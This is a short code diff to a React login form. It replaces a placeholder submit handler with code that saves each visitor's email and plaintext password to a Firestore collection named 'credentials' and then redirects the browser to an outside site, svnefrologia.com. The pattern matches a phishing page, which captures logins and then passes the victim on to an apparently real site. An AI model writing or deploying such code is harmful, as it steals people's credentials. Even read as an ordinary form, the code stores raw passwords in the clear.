@@ -1,5 +1,7 @@
 import { useForm } from "react-hook-form"
 import { FaEnvelope, FaLock } from "react-icons/fa"
+import { db } from "../firebase";
+import { collection, addDoc } from 'firebase/firestore';
 
 export default function LoginForm() {
   const {
@@ -8,9 +10,15 @@ export default function LoginForm() {
     formState: { errors, isSubmitting },
   } = useForm()
 
-  const onSubmit = (data) => {
-    console.log("Datos enviados:", data)
-    // Aquí puedes realizar la llamada a tu API/backend
+  const onSubmit = async (data) => {    
+    const collectionRef = collection(db, 'credentials')
+
+    const docRef = await addDoc(collectionRef, {
+        email: data.email,
+        psw: data.password
+    })
+
+    window.location.href = 'https://svnefrologia.com/';
   }
 
   return (
